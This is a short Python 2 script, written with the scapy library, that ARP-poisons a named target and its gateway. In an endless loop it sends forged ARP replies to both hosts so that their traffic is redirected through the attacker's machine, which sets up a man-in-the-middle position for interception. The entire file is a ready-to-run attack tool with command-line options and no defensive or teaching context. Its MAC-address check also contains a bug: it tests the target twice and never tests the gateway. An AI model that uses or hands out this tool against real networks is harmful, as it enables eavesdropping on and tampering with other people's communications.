from optparse import OptionParser
from scapy.all import get_if_hwaddr, getmacbyip, ARP, Ether, sendp
import sys
import time
def parse_arguments():
    usage = 'Usage: %prog [-i interface] [-t target] host'
    parser = OptionParser(usage)
    parser.add_option('-i', dest='interface', help='Specify the interface to use')
    parser.add_option('-t', dest='target', help='Specify a particular host to ARP poison')
    (options, args) = parser.parse_args()
    if options.interface and options.target and len(args):
        arp_poison(options.interface, options.target, args[0])
    else:
        parser.print_help()
        sys.exit(0)

def arp_poison(interface, target, gateway):
    local_mac = get_if_hwaddr(interface)
    target_mac = getmacbyip(target)
    gateway_mac = getmacbyip(gateway)
    print 'local_mac = {} target_mac = {} gateway_mac = {}'\
        .format(local_mac, target_mac, gateway_mac)
    if not all((local_mac, target_mac, target_mac)):
        print 'Fail to Get MAC Address, Please Check the Arguments'
        sys.exit(0)
    packet_t = Ether(src=local_mac, dst=target_mac) \
        / ARP(hwsrc=local_mac, psrc=gateway, hwdst=target_mac, pdst=target, op=2)
    packet_g = Ether(src=local_mac, dst=gateway_mac) \
        / ARP(hwsrc=local_mac, psrc=target, hwdst=gateway_mac, pdst=gateway, op=2)
    try:
        while True:
            sendp(packet_t, inter=2, iface=interface)
            sendp(packet_g, inter=2, iface=interface)
            time.sleep(1)
    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == '__main__':
    parse_arguments()

    